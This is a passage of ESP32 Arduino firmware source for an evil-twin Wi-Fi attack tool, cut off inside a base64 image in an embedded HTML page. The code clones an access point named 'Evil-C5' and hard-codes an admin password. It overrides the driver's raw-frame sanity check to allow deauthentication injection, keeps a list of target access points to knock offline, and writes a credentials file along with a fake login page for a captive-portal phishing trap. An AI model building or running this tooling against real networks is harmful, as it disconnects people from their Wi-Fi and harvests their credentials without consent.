#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <FS.h>
#include <vector>


extern "C" {
#include "esp_wifi.h"
#include "esp_wifi_types.h"
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

//------------------------------------------------------------------
// ── CONFIG GLOBALE ───────────────────────────────────────────────
//------------------------------------------------------------------
static WebServer server(80);
static DNSServer dns;
constexpr byte  DNS_PORT = 53;

String clonedSSID            = "Evil‑C5";
String captivePortalPassword = "";
String accessWebPassword     = "7h30th3r0n3";
String selectedPortalFile    = "/normal.html";

String ipAddress = "";
bool isCaptivePortalOn = false;
bool wificonnected = false;
bool pageAccessFlag = false;
File saveFileObject;
bool isSaveFileAuthorized = false;

bool deauthRunning = false;
unsigned long lastDeauth = 0;
uint8_t targetBSSID[6];
uint8_t targetChannel = 1;

struct WiFiAccessPoint {
  String ssid;
  String bssid;
  int rssi;
  int channel;
};

std::vector<WiFiAccessPoint> scannedNetworks;

// ------------------------------------------------------------------
// ── De‑authentication target list ──────────────────────────────────
//-------------------------------------------------------------------
struct DeauthTarget {
  uint8_t bssid[6];   // MAC address of the AP to hit
  uint8_t channel;    // channel on which that AP is heard
};

std::vector<DeauthTarget> deauthTargets;   // list built in /launch‑deauth

//------------------------------------------------------------------
// ── OUTILS FICHIERS LittleFS ───────────────────────────────────────
//------------------------------------------------------------------
void ensureFile(const char* path, const char* content = "") {
  if (!LittleFS.exists(path)) {
    File f = LittleFS.open(path, FILE_WRITE);
    if (f) {
      f.print(content);
      f.close();
    }
  }
}

void initFilesystem() {
  if (!LittleFS.begin(true)) {
    Serial.println("[FS] mount failed");
    while (true);
  }
  ensureFile("/credentials.txt");
  ensureFile("/normal.html",
             "<!doctypehtml><html lang=fr><meta charset=UTF-8><title>Error</title><style>body{font-family:Arial,sans-serif;background-color:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}p{text-align:center}.login-form{background-color:#fff;padding:20px;border-radius:5px;box-shadow:0 0 10px rgba(0,0,0,.1)}.form-control{margin-bottom:10px;padding:10px;font-size:16px;border-radius:5px;border:1px solid #ddd}.form-control:last-child{margin-bottom:0}.btn{padding:10px 20px;background-color:#007bff;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:16px}.btn:hover{background-color:#0056b3}.login-image{background-image:url(data:image/png;base64,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